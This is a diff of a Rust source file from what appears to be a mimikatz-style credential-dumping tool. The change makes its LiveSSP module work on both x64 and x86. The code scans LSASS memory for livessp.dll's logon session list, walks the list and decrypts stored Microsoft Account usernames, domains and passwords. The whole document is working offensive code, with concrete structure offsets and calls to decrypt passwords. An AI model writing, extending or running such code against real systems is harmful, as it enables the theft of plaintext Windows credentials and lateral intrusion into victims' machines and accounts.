@@ -1,44 +1,46 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::LiveSspCredential;
+use crate::lsass::types::{Arch, LiveSspCredential, read_ptr, read_ustring, is_valid_user_ptr};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
-/// KIWI_LIVESSP_LIST_ENTRY offsets (Windows 10 x64):
-///   +0x00: Flink
-///   +0x08: Blink
-///   +0x10..+0x34: unk0-unk4 (PVOID fields)
-///   +0x38: LUID (8 bytes)
-///   +0x40: unk5 (PTR)
-///   +0x48: unk6 (PTR)
-///   +0x50: suppCreds (PVOID -> KIWI_LIVESSP_PRIMARY_CREDENTIAL)
-///
-/// KIWI_LIVESSP_PRIMARY_CREDENTIAL:
-///   +0x00: isSupp_or_isNtlm (ULONG + 4 pad)
-///   +0x08: unknown0 (PVOID)
-///   +0x10: credentials (KIWI_GENERIC_PRIMARY_CREDENTIAL):
-///     +0x10+0x00: UserName (UNICODE_STRING)
-///     +0x10+0x10: DomainName (UNICODE_STRING)
-///     +0x10+0x20: Password (UNICODE_STRING, encrypted)
-const OFFSET_FLINK: u64 = 0x00;
-const OFFSET_LUID: u64 = 0x38;
-const OFFSET_SUPP_CREDS: u64 = 0x50;
+/// Per-arch offsets for KIWI_LIVESSP_LIST_ENTRY and KIWI_LIVESSP_PRIMARY_CREDENTIAL.
+struct LiveSspOffsets {
+    luid: u64,
+    supp_creds: u64,
+    supp_username: u64,
+    supp_domain: u64,
+    supp_password: u64,
+}
 
-const SUPP_USERNAME: u64 = 0x10;
-const SUPP_DOMAIN: u64 = 0x20;
-const SUPP_PASSWORD: u64 = 0x30;
+const LIVESSP_OFFSETS_X64: LiveSspOffsets = LiveSspOffsets {
+    luid: 0x40, supp_creds: 0x60,
+    supp_username: 0x08, supp_domain: 0x18, supp_password: 0x28,
+};
 
-/// Extract LiveSSP credentials from livessp.dll.
+/// x86 offsets.
+const LIVESSP_OFFSETS_X86: LiveSspOffsets = LiveSspOffsets {
+    luid: 0x24, supp_creds: 0x38,
+    supp_username: 0x08, supp_domain: 0x10, supp_password: 0x18,
+};
+
+/// Extract LiveSSP credentials from livessp.dll (unified x64/x86).
 ///
 /// LiveSSP stores Microsoft Account credentials. The DLL may not be loaded
 /// on systems that don't use Microsoft Accounts.
-pub fn extract_livessp_credentials(
-    vmem: &impl VirtualMemory,
+pub fn extract_livessp_credentials_arch(
+    vmem: &dyn VirtualMemory,
     livessp_base: u64,
     _livessp_size: u32,
     keys: &CryptoKeys,
+    arch: Arch,
 ) -> Result<Vec<(u64, LiveSspCredential)>> {
+    let offsets = match arch {
+        Arch::X64 => &LIVESSP_OFFSETS_X64,
+        Arch::X86 => &LIVESSP_OFFSETS_X86,
+    };
+
     let pe = PeHeaders::parse_from_memory(vmem, livessp_base)?;
     let mut results = Vec::new();
 
@@ -46,13 +48,10 @@ pub fn extract_livessp_credentials(
         Some(s) => s,
         None => return Ok(results),
     };
-
     let text_base = livessp_base + text.virtual_address as u64;
 
     let (pattern_addr, _) = match patterns::find_pattern(
-        vmem,
-        text_base,
-        text.virtual_size,
+        vmem, text_base, text.virtual_size,
         patterns::LIVESSP_LOGON_SESSION_PATTERNS,
         "LiveGlobalLogonSessionList",
     ) {
@@ -63,14 +62,22 @@ pub fn extract_livessp_credentials(
         }
     };
 
-    // Search nearby for LEA instruction referencing LiveGlobalLogonSessionList
-    let list_addr = patterns::find_list_via_lea(vmem, pattern_addr, "LiveGlobalLogonSessionList")?;
-    log::info!("LiveSSP LiveGlobalLogonSessionList at 0x{:x}", list_addr);
+    let list_addr = match arch {
+        Arch::X64 => patterns::find_list_via_lea(vmem, pattern_addr, "LiveGlobalLogonSessionList")?,
+        Arch::X86 => {
+            let ds = match pe.find_section(".data") {
+                Some(s) => s,
+                None => return Ok(results),
+            };
+            let data_base = livessp_base + ds.virtual_address as u64;
+            let data_end = data_base + ds.virtual_size as u64;
+            patterns::find_list_via_abs(vmem, pattern_addr, livessp_base, data_base, data_end, "livessp")?
+        }
+    };
+    log::info!("LiveSSP list at 0x{:x}", list_addr);
 
-    // Walk the doubly-linked list
-    let head_flink = vmem.read_virt_u64(list_addr)?;
+    let head_flink = read_ptr(vmem, list_addr, arch)?;
     if head_flink == 0 || head_flink == list_addr {
-        log::info!("LiveSSP: session list is empty");
         return Ok(results);
     }
 
@@ -83,57 +90,31 @@ pub fn extract_livessp_credentials(
         }
         visited.insert(current);
 
-        let luid = vmem.read_virt_u64(current + OFFSET_LUID).unwrap_or(0);
-        let supp_ptr = vmem.read_virt_u64(current + OFFSET_SUPP_CREDS).unwrap_or(0);
+        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
+        let supp_ptr = read_ptr(vmem, current + offsets.supp_creds, arch).unwrap_or(0);
 
-        if supp_ptr > 0x10000 && (supp_ptr >> 48) == 0 {
-            let username = vmem
-                .read_win_unicode_string(supp_ptr + SUPP_USERNAME)
-                .unwrap_or_default();
-            let domain = vmem
-                .read_win_unicode_string(supp_ptr + SUPP_DOMAIN)
-                .unwrap_or_default();
+        if is_valid_user_ptr(supp_ptr, arch) {
+            let username = read_ustring(vmem, supp_ptr + offsets.supp_username, arch).unwrap_or_default();
+            let domain = read_ustring(vmem, supp_ptr + offsets.supp_domain, arch).unwrap_or_default();
 
             if !username.is_empty() {
-                let password = crate::lsass::crypto::decrypt_unicode_string_password(
-                    vmem,
-                    supp_ptr + SUPP_PASSWORD,
-                    keys,
+                let password = crate::lsass::crypto::decrypt_unicode_string_password_arch(
+                    vmem, supp_ptr + offsets.supp_password, keys, arch,
                 );
-
                 log::debug!(
                     "LiveSSP: LUID=0x{:x} user={} domain={} pwd_len={}",
-                    luid,
-                    username,
-                    domain,
-                    password.len()
+                    luid, username, domain, password.len()
                 );
-                results.push((
-                    luid,
-                    LiveSspCredential {
-                        username,
-                        domain,
-                        password,
-                    },
-                ));
+                results.push((luid, LiveSspCredential { username, domain, password }));
             }
         }
 
-        current = match vmem.read_virt_u64(current + OFFSET_FLINK) {
+        current = match read_ptr(vmem, current, arch) {
             Ok(f) => f,
             Err(_) => break,
         };
     }
 
-    let with_passwords = results
-        .iter()
-        .filter(|(_, c)| !c.password.is_empty())
-        .count();
-    log::info!(
-        "LiveSSP: found {} entries ({} with passwords)",
-        results.len(),
-        with_passwords
-    );
-
+    log::info!("LiveSSP: found {} entries", results.len());
     Ok(results)
 }
